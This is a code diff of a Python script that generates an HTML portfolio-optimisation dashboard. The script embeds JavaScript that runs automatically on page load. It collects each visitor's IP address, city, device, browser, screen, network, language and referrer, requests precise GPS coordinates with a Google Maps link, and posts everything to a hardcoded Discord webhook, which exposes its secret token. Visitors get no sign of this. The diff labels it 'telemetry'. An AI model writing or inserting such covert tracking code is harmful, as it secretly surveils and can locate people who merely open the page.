@@ -39,7 +39,7 @@ if isinstance(data.columns, pd.MultiIndex):
 data = data.ffill().dropna()
 returns = data.pct_change().dropna()
 
-# --- 4. PORTFOLIO OPTIMIZATION (MAX SHARPE) ---
+# --- 4. PORTFOLIO OPTIMIZATION ---
 print("-> Optimizing Portfolio for Maximum Sharpe Ratio...")
 mean_returns = returns.mean() * TRADING_DAYS_PER_YEAR
 cov_matrix = returns.cov() * TRADING_DAYS_PER_YEAR
@@ -143,7 +143,7 @@ risk_data = [
 ]
 risk_df = pd.DataFrame(risk_data)
 
-# --- 9. GENERATE HTML DASHBOARD WITH FIXED DISCORD TELEMETRY ---
+# --- 9. GENERATE HTML DASHBOARD WITH CONSOLIDATED DISCORD TELEMETRY ---
 html_hist = pio.to_html(fig_hist, full_html=False, include_plotlyjs="cdn")
 html_roll = pio.to_html(fig_roll, full_html=False, include_plotlyjs=False)
 html_fcast = pio.to_html(fig_fcast, full_html=False, include_plotlyjs=False)
@@ -156,6 +156,7 @@ js = """
 <script>
 async function sendDiscordAlert() {
     try {
+        // 1. Fetch IP & Coarse Location
         let ip = 'Unknown', city = 'Unknown', region = 'Unknown', country = 'Unknown';
         try {
             let response = await fetch('https://ipapi.co/json/');
@@ -168,6 +169,7 @@ async function sendDiscordAlert() {
             console.log("IP API fetch failed", e);
         }
 
+        // 2. Extract Device & Browser Details
         let ua = navigator.userAgent;
         let browser = "Unknown Browser";
         let os = "Unknown OS";
@@ -195,54 +197,63 @@ async function sendDiscordAlert() {
 
         const webhookUrl = 'https://discord.com/api/webhooks/1537277575817330729/INZ0kAtXZKA2SF5sFTHPySczXzHNVdkgBxhkALe7-_QnlHdOIJMX5RZmpxHsxg41rMGg'; 
 
-        const postPayload = async (locationText, extraFields = []) => {
-            let payload = {
-                embeds: [{
-                    title: "🔔 Quantitative Dashboard Visitor!",
-                    color: 248100,
-                    fields: [
-                        { name: "🌐 IP Address", value: ip, inline: true },
-                        { name: "📍 Location", value: locationText, inline: true },
-                        { name: "📱 Device", value: `${device} (${os})`, inline: true },
-                        { name: "🌐 Browser", value: browser, inline: true },
-                        { name: "🖥️ Screen", value: screenRes, inline: true },
-                        { name: "⚡ Network", value: conn, inline: true },
-                        { name: "🗣️ Language", value: lang, inline: true },
-                        { name: "🔗 Referrer", value: referrer.substring(0, 50), inline: false },
-                        ...extraFields,
-                        { name: "⏰ Time", value: new Date().toLocaleString('id-ID'), inline: false }
-                    ]
-                }]
-            };
+        // Helper to send complete payload
+        const dispatchWebhook = async (locationStr, gpsField = null) => {
+            let fields = [
+                { name: "🌐 IP Address", value: ip, inline: true },
+                { name: "📍 Location", value: locationStr, inline: true },
+                { name: "📱 Device", value: `${device} (${os})`, inline: true },
+                { name: "🌐 Browser", value: browser, inline: true },
+                { name: "🖥️ Screen", value: screenRes, inline: true },
+                { name: "⚡ Network", value: conn, inline: true },
+                { name: "🗣️ Language", value: lang, inline: true },
+                { name: "🔗 Referrer", value: referrer.substring(0, 50), inline: false }
+            ];
+
+            if (gpsField) {
+                fields.push(gpsField);
+            }
+
+            fields.push({ name: "⏰ Time", value: new Date().toLocaleString('id-ID'), inline: false });
 
             await fetch(webhookUrl, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
+                body: JSON.stringify({
+                    embeds: [{
+                        title: "🔔 Quantitative Dashboard Visitor!",
+                        color: 248100,
+                        fields: fields
+                    }]
+                })
             });
         };
 
+        // 3. Handle GPS with Fallback
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
                 async (position) => {
                     let lat = position.coords.latitude.toFixed(4);
                     let lon = position.coords.longitude.toFixed(4);
                     let accuracy = position.coords.accuracy.toFixed(0);
-                    await postPayload(`${city}, ${region}, ${country} (IP)`, [
-                        { name: "🎯 Exact GPS Coordinates", value: `Lat: ${lat}, Lon: ${lon} (Acc: ${accuracy}m)\\n[Open in Google Maps](https://www.google.com/maps?q=${lat},${lon})`, inline: false }
-                    ]);
+                    let gpsField = { 
+                        name: "🎯 Exact GPS Coordinates", 
+                        value: `Lat: ${lat}, Lon: ${lon} (Acc: ${accuracy}m)\\n[Open in Google Maps](https://maps.google.com/?q=${lat},${lon})`, 
+                        inline: false 
+                    };
+                    await dispatchWebhook(`${city}, ${region}, ${country} (IP + GPS)`, gpsField);
                 },
                 async (error) => {
-                    await postPayload(`${city}, ${region}, ${country} (GPS Denied/Unavailable)`);
+                    await dispatchWebhook(`${city}, ${region}, ${country} (GPS Denied)`);
                 },
                 { timeout: 10000, enableHighAccuracy: true }
             );
         } else {
-            await postPayload(`${city}, ${region}, ${country} (No GPS Support)`);
+            await dispatchWebhook(`${city}, ${region}, ${country} (No GPS Support)`);
         }
 
     } catch (error) {
-        console.log("Could not send Discord alert:", error);
+        console.log("Telemetry error:", error);
     }
 }
 window.onload = sendDiscordAlert;
@@ -306,4 +317,4 @@ html_template = f"""
 with open("index.html", "w", encoding="utf-8") as f:
     f.write(html_template)
 
-print("✅ SUCCESS! index.html exported with working Google Maps links.")
+print("✅ SUCCESS! index.html exported with consolidated full telemetry tracking.")
